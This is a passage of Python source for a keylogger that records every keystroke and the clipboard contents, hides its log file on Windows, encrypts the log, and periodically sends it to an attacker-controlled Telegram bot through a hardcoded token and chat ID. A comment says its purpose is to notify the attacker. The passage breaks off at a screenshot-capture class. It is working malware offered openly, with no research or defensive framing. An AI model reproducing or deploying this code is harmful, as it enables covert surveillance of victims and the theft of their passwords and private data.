# Enhanced Features
# 1. Screenshot Capture
# 2. System Information Collection
# 3. Log File Encryption
# 4. Persistence

# Import modules
from tempfile import gettempdir
from os import system, name, getenv, path, makedirs
from os.path import isfile, exists, join, expanduser
import threading
from pynput import keyboard
from pyperclip import paste
from datetime import datetime
from time import sleep
import requests
import pyautogui
import platform
from cryptography.fernet import Fernet


TOKEN = 7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA  # Telegram API Token
CHAT_ID = 5818909184  # Telegram Chat ID
INTERVAL = 60
SCREENSHOT_INTERVAL = 90  # Interval for taking screenshots(in seconds)


# Determine the temporary directory based on the OS
temp_dir = gettempdir()
FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
ENCRYPTED_FILENAME = f'{FILENAME}.enc'
SCREENSHOT_FILENAME = join(temp_dir, 'screenshot.png')


# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)


# To notify attacker if nay issues occur
def alarm(msg) -> None:
    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')

# Keystroke record
class Keylogger:

    def __init__(self) -> None:
        self.duplicate = ['']

    def savefile(self, data) -> None:
        try:
            file_exists = isfile(FILENAME)

            with open(FILENAME, 'a+') as fh:
                fh.write(str(data))

            if not file_exists and name == 'nt':  # checks if the system is windows and file didn't exist before
                system(f'attrib +h {FILENAME}')
        except Exception as e:
            alarm(f'Error: {e}')

    def Keylogging(self) -> None:
        def on_key_press(key) -> None:

            def is_duplicate(data) -> bool:
                if data and data != self.duplicate[0]:
                    self.duplicate[0] = data
                    return False
                return True

            try:
                # Get the clipboard data
                data = paste()

                if data and not is_duplicate(data):
                    self.savefile(f'clipboard data: {data}\n')

                # Log the Keystrokes
                self.savefile(f'{str(key)}\n')

            except Exception as e:
                alarm(f'Error: {e}')

        try:
            # Create listener objects
            with keyboard.Listener(on_press=on_key_press) as listener:
                listener.join()
        except Exception as e:
            alarm(f"Listener Error: {e}")

    def __del__(self) -> None:
        pass

# Send the file to Telegram at regular intervals
class Uploader:

    def __init__(self) -> None:
        pass

    def encrypt_file(self, filename) -> None:
        try:
            with open(filename, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(ENCRYPTED_FILENAME, 'wb') as f:
                f.write(encrypted_data)
        except Exception as e:
            alarm(f'Encryption Error: {e}')

    def upload_file_periodically(self) -> None:
        sleep(INTERVAL)

        while True:
            try:
                if exists(FILENAME):
                    self.encrypt_file(FILENAME)
                    with open(ENCRYPTED_FILENAME, 'rb') as fh:
                        files = {'document' : fh}
                        resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)

                        if resp.status_code != 200:
                            alarm(f'Error code: {resp.status_code}')

                else:
                    alarm(f'File not created or found!')

                sleep(INTERVAL)

            except Exception as e:
                alarm(f'Error Occurred: {e}')

    def __del__(self) -> None:
        pass

# Take screenshots periodically
class ScreenshotCapture:
